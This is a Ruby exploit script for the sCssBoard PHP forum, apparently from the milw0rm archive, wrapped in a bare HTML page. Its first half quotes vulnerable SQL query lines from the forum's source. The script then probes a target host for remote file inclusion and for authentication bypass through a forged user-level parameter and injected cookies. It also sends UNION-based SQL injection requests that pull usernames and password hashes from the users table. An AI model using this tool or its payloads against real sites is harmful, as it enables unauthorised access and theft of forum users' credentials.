<html><head><title>sCssBoard (pwnpack) Multiple Versions Remote Exploit</title></head><pre>#!/usr/bin/ruby
#inphex - i didnt include all of those bugs into the code,this code basicly  checks if the forum is vulnerable and also exploits SQL Injection bug!
#all versions on sourceforge seem to be the same ;\ so check is beeing done on each version. - scb_  is set as default table prefix
#this forum is very very very buggy,probably there are more bugs...those SQL queries etc ive used of course can be modified
#/*
#** sCssBoard, an extremely fast and flexible CSS-based message board system 
#** Copyright (CC) 2005 Elton Muuga
#**
#** This work is licensed under the Creative Commons Attribution-NonCommercial-ShareAlike License. 
#** To view a copy of this license, visit http://creativecommons.org/licenses/by-nc-sa/2.0/ or send 
#** a letter to Creative Commons, 559 Nathan Abbott Way, Stanford, California 94305, USA.
#*/

#probably not all 

#&amp;act=showforum&amp;f=1&amp;t=3%20AND%201=0,blind sql injction
#/functions/post.php

#@mysql_query(&quot;insert into $_CON[prefix]posts (posts_main,posts_topic,posts_name,posts_body,posts_starter,posts_posted,posts_forum) values('yes','$next_topic','$topicname','$body','$uid','$currdate_time','$_GET[f]')&quot;);
#				$topic_post_id = @mysql_fetch_array(@mysql_query(&quot;select posts_id from $_CON[prefix]posts where posts_main = 'yes' and posts_topic = '$next_topic'&quot;));
#				@mysql_query(&quot;update $_CON[prefix]posts set posts_topic_lastpost = '$topic_post_id[0]' where posts_main = 'yes' and posts_topic = '$next_topic'&quot;);



#########################################################################################################
#########################################################################################################
#########################################################################################################

#/functions/post.php

#@mysql_query(&quot;insert into $_CON[prefix]posts (posts_main,posts_topic,posts_body,posts_starter,posts_posted,posts_forum) values('no','$topic_details[posts_topic]','$body','$uid','$currdate_time','$_GET[f]')&quot;);



#########################################################################################################
#########################################################################################################
#########################################################################################################
#/functions/post.php


#			@mysql_query(&quot;update $_CON[prefix]posts set posts_body = '$body' where posts_id = '$_GET[p]'&quot;);
#			@mysql_query(&quot;update $_CON[prefix]posts set posts_name = '$topicname' where posts_id = '$_GET[p]' and posts_main = 'yes'&quot;);



#########################################################################################################
#########################################################################################################
#########################################################################################################

#/functions/post.php

#$edited_post = @mysql_fetch_array(@mysql_query(&quot;select * from $_CON[prefix]posts where posts_id = '$_GET[p]'&quot;));



#########################################################################################################
#########################################################################################################
#########################################################################################################

#/functions/post.php

#								$quoted_post = @mysql_fetch_array(@mysql_query(&quot;select * from $_CON[prefix]posts where posts_id = '$_GET[q]'&quot;))



#########################################################################################################
#########################################################################################################
#########################################################################################################

#/functions/showforum.php

#$get_cat = @mysql_fetch_array(@mysql_query(&quot;select * from $_CON[prefix]forums where forums_id = $_GET[f]&quot;));
#$all_topics = @mysql_query(&quot;select * from $_CON[prefix]posts where posts_forum = $_GET[f] and posts_main = 'yes' order by posts_topic_lastpost desc&quot;);
#$topic_query = @mysql_query(&quot;select * from $_CON[prefix]posts where posts_forum = $_GET[f] and posts_main = 'yes' order by posts_topic_lastpost desc limit $start,$end&quot;);
#$num_topics = @mysql_num_rows($all_topics);
#								
#while($topic_show = @mysql_fetch_array($topic_query)) {
#$total_replies_topic = @mysql_num_rows(@mysql_query(&quot;select * from $_CON[prefix]posts where posts_forum = $_GET[f] and posts_topic = '$topic_show[posts_topic]' and posts_main = 'no



#########################################################################################################
#########################################################################################################
#########################################################################################################

#/functions/showtopic.php

	#} else {
	#	if (!$_GET[deltopic]) {
	#		$result = mysql_query(&quot;delete from $_CON[prefix]posts where posts_id = '$_GET[del]'&quot;);
	#		$location_string = &quot;&amp;amp;t=$_GET[t]&quot;;
	#	} else {
	#		$result = mysql_query(&quot;delete from $_CON[prefix]posts where posts_topic = '$_GET[del]'&quot;);
	#	}
  
  
  
#########################################################################################################
#########################################################################################################
#########################################################################################################

#/functions/showtopic.php

#} elseif ($_GET[lock]) {
#
#@mysql_query(&quot;update $_CON[prefix]posts set posts_topic_locked = '$_GET[lock]' where posts_topic = '$_GET[t]' and posts_main = 'yes'&quot;);



#########################################################################################################
#########################################################################################################
#########################################################################################################

#/functions/showtopic.php

#@mysql_query(&quot;update $_CON[prefix]posts set posts_views = posts_views + 1 where posts_topic = $_GET[t] and posts_forum = $_GET[f] and posts_main = 'yes'&quot;);
#
#$forum = @mysql_fetch_array(@mysql_query(&quot;select * from $_CON[prefix]forums where forums_id = $_GET[f]&quot;));
#
#if ($ulvl &lt; $forum[forums_p_read]) { die(&quot;&lt;p align='center'&gt;You are not authorized to view this topic.&lt;/p&gt;&quot;); }
#
#$topic_perms = @mysql_fetch_array(@mysql_query(&quot;select * from $_CON[prefix]posts where posts_topic = '$_GET[t]' and posts_main = 'yes'&quot;));
#
#            $posts_query = @mysql_query(&quot;select * from $_CON[prefix]posts where posts_topic = '$_GET[t]' and posts_forum = $_GET[f] and posts_main = 'yes'&quot;);



#########################################################################################################
#########################################################################################################
#########################################################################################################

#/functions/showtopic.php


#$all_replies = @mysql_query(&quot;select * from $_CON[prefix]posts where posts_forum = $_GET[f] and posts_topic = $_GET[t] and posts_main = 'no'&quot;);
 #                           $replies_query = @mysql_query(&quot;select * from $_CON[prefix]posts where posts_forum = $_GET[f] and posts_topic = $_GET[t] and posts_main = 'no' order by posts_posted asc limit $start,$end&quot;);
#							$num_replies = @mysql_num_rows($all_replies);
#	if ((!$_GET[level_h]) and (!$_GET[level])) {
#		$users_query = mysql_query(&quot;select * from $_CON[prefix]users&quot;);
#	} elseif ($_GET[level_h]) {
#		$users_query = mysql_query(&quot;select * from $_CON[prefix]users where users_level &gt;= '$_GET[level_h]'&quot;);
#		echo mysql_error();
#	} elseif ($_GET[level]) {
#		$users_query = mysql_query(&quot;select * from $_CON[prefix]users where users_level = '$_GET[level]'&quot;);
#	}
#$numposts = mysql_num_rows(mysql_query(&quot;select * from $_CON[prefix]posts where posts_starter = '$users_show[users_id]'&quot;));



#########################################################################################################
#########################################################################################################
#########################################################################################################

#/functions/register.php


#@mysql_query(&quot;insert into $_CON[prefix]users(users_username,users_password,users_email,users_style) values('$username','$password','$email','$_MAIN[default_style]')&quot;);


#########################################################################################################
#########################################################################################################
#########################################################################################################
#########################################################################################################
#########################################################################################################
#########################################################################################################

#admin/forums.php

#} else {
#
#		$done = @mysql_query(&quot;insert into $_CON[prefix]categories(category_name) values('$_POST[cat_name]')&quot;);
#		if ($done == 1) {
#		echo &quot;&lt;center&gt;&lt;b&gt;Category ($_POST[cat_name]) created.&lt;/b&gt;&lt;/center&gt;&lt;br /&gt;&lt;br /&gt;&quot;;
#		echo redirect(&quot;?act=admin-forums&quot;, 1);
#		} else {
#		echo &quot;&lt;center&gt;&lt;b&gt;Sorry, I was unable to create the category.&lt;/b&gt;&lt;/center&gt;&lt;br /&gt;&lt;br /&gt;&quot;;
#		}




#########################################################################################################
#########################################################################################################
#########################################################################################################

#/admin/forums.php

#} elseif ($_GET[editcat]) {
#
#	if (!$_GET[go]) {
#
#$category_2edit = @mysql_fetch_array(@mysql_query(&quot;select * from $_CON[prefix]categories where category_id = '$_GET[editcat]'&quot;));



#########################################################################################################
#########################################################################################################
#########################################################################################################

#/admin/forums.php

#		if ($_POST[cat_name] != &quot;&quot;) {
#			$done = @mysql_query(&quot;update $_CON[prefix]categories set category_name = '$_POST[cat_name]' where category_id = '$_GET[editcat]'&quot;);



#########################################################################################################
#########################################################################################################
#########################################################################################################

#/admin/forums.php

#} elseif ($_GET[delcat]) {
#
#	if (!$_GET[go]) {
#		$category_2del = @mysql_fetch_array(@mysql_query(&quot;select * from $_CON[prefix]categories where category_id = '$_GET[delcat]'&quot;));



#########################################################################################################
#########################################################################################################
#########################################################################################################

#/admin/forums.php

#@mysql_query(&quot;delete from $_CON[prefix]categories where category_id = '$_GET[delcat]'&quot;);



#########################################################################################################
#########################################################################################################
#########################################################################################################

#/admin/forums.php

#//**********************************************************************
#// Begin Edit Forum
#//**********************************************************************
#
#} elseif ($_GET[editforum]) {
#
#	if (!$_POST[forums_name]) {
#		$forum_2edit = @mysql_fetch_array(@mysql_query(&quot;select * from $_CON[prefix]forums where forums_id = '$_GET[editforum]'&quot;));



#########################################################################################################
#########################################################################################################
#########################################################################################################

#/admin/forums.php

#	} else {
#
#			$done = @mysql_query(&quot;update $_CON[prefix]forums set forums_name = '$_POST[forums_name]', forums_category = '$_POST[forums_category]', forums_description = '$_POST[forums_desc]', forums_p_read = '$_POST[forums_p_read]', forums_p_topic = '$_POST[forums_p_topic]', forums_p_reply = '$_POST[forums_p_reply]' where forums_id = '$_GET[editforum]'&quot;);



#########################################################################################################
#########################################################################################################
#########################################################################################################

#/admin/forums.php

#} elseif ($_GET[delforum]) {
#
#	if (!$go) {
#
#		$forum_2del = @mysql_fetch_array(@mysql_query(&quot;select * from $_CON[prefix]forums where forums_id = '$_GET[delforum]'&quot;));



#########################################################################################################
#########################################################################################################
#########################################################################################################

#/admin/forums.php

#		@mysql_query(&quot;delete from $_CON[prefix]posts where posts_forum = '$_GET[delforum]'&quot;);
#		@mysql_query(&quot;delete from $_CON[prefix]forums where forums_id = '$_GET[delforum]'&quot;);




#########################################################################################################
#########################################################################################################
#########################################################################################################

#/admin/forums.php

#} elseif ($_GET[reorder]) {
#
#	$cat_order = $_POST[cat_order];
#	$forum_order = $_POST[forum_order];
#
#	foreach($cat_order as $c_id =&gt; $c_order) {
#
#		@mysql_query(&quot;update $_CON[prefix]categories set category_order = '$c_order' where category_id = '$c_id'&quot;);
#	
#}
#
#	foreach($forum_order as $f_id =&gt; $f_order) {
#
#		@mysql_query(&quot;update $_CON[prefix]forums set forums_order = '$f_order' where forums_id = '$f_id'&quot;);
#	
#	}
#	echo redirect(&quot;?act=admin-forums&quot;);



#########################################################################################################
#########################################################################################################
#########################################################################################################

#if ($board_name) {
#	@mysql_query(&quot;update $_CON[prefix]settings set setting_value = '$_POST[board_name]' where setting_name = 'board_name'&quot;); 
#	@mysql_query(&quot;update $_CON[prefix]settings set setting_value = '$_POST[allow_signups]' where setting_name = 'allow_signups'&quot;);
#	@mysql_query(&quot;update $_CON[prefix]settings set setting_value = '$_POST[cookie_url]' where setting_name = 'cookie_url'&quot;);
#	@mysql_query(&quot;update $_CON[prefix]settings set setting_value = '$_POST[cookie_path]' where setting_name = 'cookie_path'&quot;);
#	@mysql_query(&quot;update $_CON[prefix]settings set setting_value = '$_POST[redir_method]' where setting_name = 'redir_method'&quot;);
#	@mysql_query(&quot;update $_CON[prefix]settings set setting_value = '$_POST[sig_bbcode]' where setting_name = 'sig_bbcode'&quot;);
#	@mysql_query(&quot;update $_CON[prefix]settings set setting_value = '$_POST[debug_level]' where setting_name = 'debug_level'&quot;);
#	@mysql_query(&quot;update $_CON[prefix]settings set setting_value = '$_POST[date_format]' where setting_name = 'date_format'&quot;);
#	@mysql_query(&quot;update $_CON[prefix]settings set setting_value = '$_POST[default_style]' where setting_name = 'default_style'&quot;);
#	@mysql_query(&quot;update $_CON[prefix]settings set setting_value = '$_POST[use_relative_dates]' where setting_name = 'use_relative_dates'&quot;);
#	echo &quot;&lt;center&gt;&lt;b&gt;Settings saved.&lt;/b&gt;&lt;/center&gt;&lt;br /&gt;&lt;br /&gt;&quot;;
#	echo redirect(&quot;?act=admin-general&quot;, 1);



#########################################################################################################
#########################################################################################################
#########################################################################################################

#old version
#if($_GET[setcookie]) {
#	$checkagain = mysql_fetch_array(mysql_query(&quot;select * from $_CON[prefix]users where users_username = '$_GET[u]' and users_password = '$_GET[p]'&quot;));
#	echo mysql_error();
#	if ($_GET[r] == 1) {
#		setcookie(&quot;sCssBoard&quot;,$checkagain[users_password],time()+2592000,&quot;$_MAIN[cookie_path]&quot;,&quot;$_MAIN[cookie_url]&quot;);
#	} else {
#		setcookie(&quot;sCssBoard&quot;,$checkagain[users_password],0,&quot;$_MAIN[cookie_path]&quot;,&quot;$_MAIN[cookie_url]&quot;);
#	}
#}
require 'open-uri'
require 'net/http'
require 'net/https'
require 'base64'
require 'irb'
require 'uri'
#Session Hijacking
#} elseif ($_GET[act] == &quot;logout&quot;) {
#	echo &quot;&lt;p align='center'&gt;&quot;;
#	if(!$current_user) {
#		echo &quot;You cannot log out, because you are not logged in.&quot;;
#	} else {
#		setcookie(&quot;scb_uid&quot;,0,time()-2592000,&quot;$_MAIN[cookie_path]&quot;,&quot;$_MAIN[cookie_url]&quot;);
#		setcookie(&quot;scb_ident&quot;,0,time()-2592000,&quot;$_MAIN[cookie_path]&quot;,&quot;$_MAIN[cookie_url]&quot;);
#		echo &quot;Logged out successfully.&quot;;
#		echo redirect(&quot;index.php&quot;);
#	}
#	echo &quot;&lt;/p&gt;&lt;br /&gt;&quot;;
#########################################################################################################
#			$body = $_POST[body];
#if($body == &quot;&quot;) {
#				echo &quot;&lt;p align='center' style='background-color:#fff; color:#333; padding:10px;'&gt;Error: The post was left blank. &lt;a href='javascript:history.back()'&gt;Back...&lt;/a&gt;&lt;/p&gt;&quot;;
#			} else {
#				$topic_details = @mysql_fetch_array(@mysql_query(&quot;select * from $_CON[prefix]posts where posts_forum = '$_GET[f]' and posts_topic = '$_GET[t]' and posts_main = 'yes'&quot;));
x = 0


cmd_n = { &quot;-h&quot; =&gt; &quot;host&quot;,&quot;-p&quot; =&gt; &quot;path&quot;}
cmd_v = {}
set = {}
puts &quot;usage: rub -h host.com -p /path/&quot;
ARGV.each do |a|
  x += 1
  cmd_n.each do |l,v|
    if a == l
      cmd_v[v] = ARGV[x]
      end
    end
  end
  class Pwnag
    r_g = 0
    m_g = 0
    def initialize(host,path,version) #let's start PWNZIN'
        puts &quot;-Going through sCssBoard Version: #{version}\n&quot;
        puts &quot;-Checking php.ini settings\n&quot;
               
        req = General.new()
        con = req.request(host,path+&quot;index.php?&amp;act=xxx&amp;inc_function=registerglobalson-'S&quot;,&quot;&quot;)
        
        if con =~ /registerglobalson/ then
          puts &quot;-register_globals = ON\n&quot;
          r_g = 1
          else 
            puts &quot;-register_globals = OFF\n&quot;
            r_g = 0
          end
          
          if con=~/registerglobalson-'S/
            puts &quot;-magic_quotes_gpc = OFF\n&quot;
            m_g = 0
            else 
              puts &quot;-magic_quotes_gpc = ON\n&quot;
              m_g = 1
            end
            
          
          req = General.new()
          con = req.request(host,path+&quot;index.php?act=profile&amp;u='union%20select%2032498394829,32982890280927337,1,1,1,1,1,1,1,1,1,1'&quot;,&quot;&quot;)     
          
          
          if con=~/32982890280927337/ then
            puts &quot;-magic_quotes_gpc = OFF\n&quot;
            m_g = 0
            else 
              puts &quot;-magic_quotes_gpc = ON\n&quot;
              m_g = 1
            end
            if r_g == 1 &amp;&amp; m_g == 0
              puts &quot;-Excellent,very very easy to exploit&quot;
              else if r_g == 0 &amp;&amp; m_g == 1
                puts &quot;-Bad luck,hard to exploit&quot;
                else if r_g == 0 &amp;&amp; m_g == 0
                  puts &quot;-Quite easy to exploit&quot;
                  else if r_g == 1 &amp;&amp; m_g == 1
                    puts &quot;-Yo,quite easy&quot;
                  end
                end
              end
            end
            
            req.exploit_shit(host,path,version)
            
          end
  end
class Ownstance
    version = &quot;1.1&quot;
    supported = [&quot;1.0&quot;,&quot;1.11&quot;,&quot;1.12&quot;]
    con = &quot;&quot;
    def initialize(set)
        unless set[:host] or set[:path] != nil
             puts &quot;HTTP Host/path?&quot;
             exit
            
          end
        end
        def checkversion(host,path)
          req = General.new()
          con = req.request(host,path,&quot;&quot;)
          
          if con=~/sCssBoard&lt;\/a&gt; 1.12/ then
            version = 1.12
          else if con =~/sCssBoard&lt;\/a&gt; 1.11/ then      
            version = 1.11
            else if con=~/sCssBoard&lt;\/a&gt; 1.0/ then   
              version = 1.0
              else
                version = &quot;unknown&quot;
              end
            end
          end
          pwn = Pwnag.new(host,path,version)
        end
  end
  
class General
  tb_prefix = &quot;scb_&quot;
  a_pb = nil
  def exploit_shit(host,path,version)
    puts &quot;-Trying to exploit sCssBoard #{version}\n&quot;
    
    if version == 1.12
      puts &quot;-------------------Checking for FILE INCLUSION Bugs-------------------&quot;
      version_112_1(host,path)
      puts &quot;-------------------END FILE INCLUSION BUGS-------------------&quot;
      puts &quot;-------------------Checking for AUTHENTICATION Bugs-------------------&quot;   
      version_112_2(host,path)
      version_112_6(host,path)
      puts &quot;-------------------END AUTHENTICATION Bugs-------------------&quot;
      puts &quot;-------------------Starting to check for SQL Injection bugs-------------------&quot;  #there are more possible
      version_112_3(host,path)
      version_112_4(host,path)
      version_112_5(host,path)
      version_112_7(host,path)
      puts &quot;-------------------END SQL Injection-------------------&quot;
      else if version == 1.11
        puts &quot;-------------------Checking for FILE INCLUSION Bugs-------------------&quot;
        version_112_1(host,path)
        puts &quot;-------------------END FILE INCLUSION BUGS-------------------&quot;
        puts &quot;-------------------Checking for AUTHENTICATION Bugs-------------------&quot;   
        version_112_2(host,path)
        version_112_6(host,path)
        puts &quot;-------------------END AUTHENTICATION Bugs-------------------&quot;
        puts &quot;-------------------Starting to check for SQL Injection bugs-------------------&quot;  
        version_112_3(host,path)
        version_112_4(host,path)
        version_112_5(host,path)
        version_112_7(host,path)
      puts &quot;-------------------END SQL Injection-------------------&quot;
        else if version == 1.0
          puts &quot;-------------------Checking for FILE INCLUSION Bugs-------------------&quot;
          version_112_1(host,path)
          puts &quot;-------------------END FILE INCLUSION BUGS-------------------&quot;
          puts &quot;-------------------Checking for AUTHENTICATION Bugs-------------------&quot;   
          version_112_2(host,path)
          version_112_6(host,path)
          puts &quot;-------------------END AUTHENTICATION Bugs-------------------&quot;
          puts &quot;-------------------Starting to check for SQL Injection bugs-------------------&quot;  
          version_112_3(host,path)
          version_112_4(host,path)
          version_112_5(host,path)
          version_112_7(host,path)
          else 
            puts &quot;-------------------Checking for FILE INCLUSION Bugs-------------------&quot;
            version_112_1(host,path)
            puts &quot;-------------------END FILE INCLUSION BUGS-------------------&quot;
            puts &quot;-------------------Checking for AUTHENTICATION Bugs-------------------&quot;   
            version_112_2(host,path)
            version_112_6(host,path)
            puts &quot;-------------------END AUTHENTICATION Bugs-------------------&quot;
            puts &quot;-------------------Starting to check for SQL Injection bugs-------------------&quot;  
            version_112_3(host,path)
            version_112_4(host,path)
            version_112_5(host,path)
            version_112_7(host,path)
          end
        end
      end
    end
    
    
    def version_112_1(host,path)
    #########################################################################################################
    #$functions = array (
    #	&quot;home&quot;				=&gt;		&quot;functions/main.php&quot;,
    #	&quot;register&quot;			=&gt;		&quot;functions/register.php&quot;,
    #	&quot;login&quot;				=&gt;		&quot;functions/loginlogout.php&quot;,
    #	&quot;logout&quot;			=&gt;		&quot;functions/loginlogout.php&quot;,
    #	&quot;profile&quot;			=&gt;		&quot;functions/profile.php&quot;,
    #	&quot;post&quot;				=&gt;		&quot;functions/post.php&quot;,
    #	&quot;users&quot;				=&gt;		&quot;functions/users.php&quot;,
    #	&quot;search&quot;			=&gt;		&quot;functions/search.php&quot;,
    #	&quot;search-results&quot;	=&gt;		&quot;functions/searchresults.php&quot;,
    #	&quot;showforum&quot;			=&gt;		&quot;_showforum&quot;,
    #	//--------------------
    #	&quot;admin-home&quot;		=&gt;		&quot;admin/main.php&quot;,
    #	&quot;admin-general&quot;		=&gt;		&quot;admin/general.php&quot;,
    #	&quot;admin-forums&quot;		=&gt;		&quot;admin/forums.php&quot;
    #	);

    #foreach ($functions as $func =&gt; $address) {
    #	if ($act == $func) {
    #		$inc_function = $address;
    #		break;
    #	}
    #}
    #
    #if ($inc_function == &quot;_showforum&quot;) {
    #	if ($_GET[t] == &quot;&quot;) {
    #		$inc_function = &quot;functions/showforum.php&quot;;
    #	} else {
    #		$inc_function = &quot;functions/showtopic.php&quot;;
    #	}
    #}
    #if ($inc_function) { 
    #	include($inc_function);  //probably rfi,lfi
    #} else {
    #	include(&quot;functions/main.php&quot;);
    #}
    #########################################################################################################  -
      con = request(host,path+&quot;index.php?&amp;act=xxxxxxx&amp;inc_function=http://shellpathownmeinph&quot;,&quot;&quot;)
      
      if con =~/URL file-access is disabled/   #automaticly means that inc_function has been given
        puts &quot;URL File-access = OFF\n&quot;
      end
      
      if con=~/shellpathownmeinph/
        puts &quot;This forum is vulnerable to RFI/LFI/RCE... -&gt;index.php?&amp;act=xxxxxxx&amp;inc_function=shell\n&quot;
      end
      
    end
    
    def version_112_2(host,path)
   #########################################################################################################
   #if ($current_user[users_level] &lt; 3) { 
   #	die(&quot;Insufficient access level.&quot;);
   #}
   #                    if($_GET[update] == &quot;now&quot;) {
   #						if (($current_user[users_level] &lt; 3) and ($_GET[u] != $_COOKIE[scb_uid])) {
   #							die(&quot;You do not have the necessary permissions to modify this profile.&quot;);
   #						}

   #########################################################################################################
      con = request(host,path+&quot;admin/forums.php?current_user[users_level]=4&quot;,&quot;&quot;)
      
      if con=~/Insufficient access level/
        
        else 
          puts &quot;This forum is vulnerable to AUTH_BYPASS,$current_user[users_level] -&gt; host/path/admin/forums.php?current_user[users_level]=4&quot;
      end
    end
    
    def version_112_3(host,path)
    #########################################################################################################
    #if ($_GET[viewcat]) {
    #$category_query = mysql_query(&quot;select * from $_CON[prefix]categories where category_id = '$_GET[viewcat]'&quot;); 
    #########################################################################################################
      con = request(host,path+&quot;index.php?viewcat='union%20select%201,2,32982890280927337'&quot;,&quot;&quot;)
      
      if con=~/32982890280927337/
        puts &quot;This forum is vulnerable to SQL Injection,index.php?viewcat='sql\n&quot;
      end
      
      
      
    end
    
    def version_112_4(host,path)
    #########################################################################################################
    #    if($_GET[f] == &quot;&quot;) {} else {
    #$forum = mysql_fetch_array(mysql_query(&quot;select * from $_CON[prefix]forums where forums_id = $_GET[f]&quot;));  
    #		echo mysql_error();
    #		if ($forum[forums_p_read] &lt;= $ulvl) {
    #$topic = mysql_fetch_array(mysql_query(&quot;select * from $_CON[prefix]posts where posts_id = $_GET[t] and posts_forum = $_GET[f] and posts_main = 'yes'&quot;)); 
    #########################################################################################################
      con = request(host,path+&quot;index.php?&amp;act=showforum&amp;f=-1%20union%20select%201,2,3,32982890280927337,5,1,1,1&quot;,&quot;&quot;)
      
      if con=~/32982890280927337/
        puts &quot;This forum is vulnerable to SQL Injection,index.php?&amp;act=showforum&amp;f=-1 sql\n&quot;
      end
      
      con = request(host,path+&quot;index.php?&amp;act=showforum&amp;f=-1%20union%20select%201,2,3,users_username,5,1,1,1%20from%20scb_users&quot;,&quot;&quot;)
      puts &quot;Username:&quot;
      regex = /&lt;title&gt;(.*?)&lt;\/title&gt;/
      credentials = con.scan(regex)
      
      puts credentials[0]
      
      con = request(host,path+&quot;index.php?&amp;act=showforum&amp;f=-1%20union%20select%201,2,3,users_password,5,1,1,1%20from%20scb_users&quot;,&quot;&quot;)
      puts &quot;Password:&quot;
      regex = /&lt;title&gt;(.*?)&lt;\/title&gt;/
      credentials = con.scan(regex)
      
      puts credentials[0]
    end
    
    
    def version_112_5(host,path)
    #no check?
    #if (!$_GET[u]) { 
    #	$user = $current_user[users_id];
    #} else {
    #	$user = $_GET[u];
    #}
    #$user_details = mysql_fetch_array(mysql_query(&quot;select * from $_CON[prefix]users where users_id = '$user'&quot;));  
      con = request(host,path+&quot;index.php?act=profile&amp;u='union%20select%2032498394829,32982890280927337,1,1,1,1,1,1,1,1,1,1'&quot;,&quot;&quot;)    
      
      if con=~/32982890280927337/
        puts &quot;This forum is vulnerable to SQL Injection,index.php?act=profile&amp;u='sql\n&quot;
      end
      
    end
    
    def version_112_6(host,path)
    #########################################################################################################  - 
    #if (($_COOKIE[scb_uid]) and ($_COOKIE[scb_ident])) {
    #$current_user = @mysql_fetch_array(@mysql_query(&quot;select * from $_CON[prefix]users where users_id = '$_COOKIE[scb_uid]' and users_password = '$_COOKIE[scb_ident]'&quot;)); 
    ######################################################################################################### -
      con = request(host,path+&quot;index.php&quot;,&quot;scb_uid=1'; scb_ident='1=1&quot;)
      
      if con=~/Logged in as/
        puts &quot;This forum is vulnerable to AUTH_BYPASS,_COOKIE -&gt; set cookie to scb_uid=1'; scb_ident='1=1\n&quot;
      end
    end
    
    def version_112_7(host,path)
    end
    
  def request(host,path,cookie)
    http = Net::HTTP.new(host, 80)
    http.use_ssl = false
    path = path

    headers = {
  'Cookie' =&gt; cookie
  }
  resp, data = http.get(path, headers)
  return data

  end
  
  
  def blind_sql
    puts &quot;Lol&quot;
  end
  end
  
  set[:host] = cmd_v[&quot;host&quot;].gsub(/http\:\/\//, &quot;&quot;)
  set[:path] = cmd_v[&quot;path&quot;]
  scss = Ownstance.new(set)
  scss.checkversion(set[:host] ,set[:path])

# milw0rm.com [2008-02-18]</pre></html>